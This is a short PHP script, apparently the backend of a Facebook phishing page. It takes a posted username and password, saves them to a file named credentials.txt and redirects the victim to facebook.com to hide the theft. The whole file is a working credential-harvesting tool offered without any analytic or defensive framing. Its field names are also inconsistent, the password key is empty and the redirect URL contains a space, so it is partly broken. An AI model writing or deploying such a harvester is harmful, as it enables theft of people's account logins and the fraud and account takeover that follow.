<?php

if(isset($_POST["amalia_corro"])){
        $user = $_POST["amalia corro"];
        $contra = $_POST[""];
        $file = fopen("credentials.txt", "w+");
        fwrite($file, "Usuario: $user
Contrasena: $contra
");
        header('location: http:// facebook.com');
}
?>
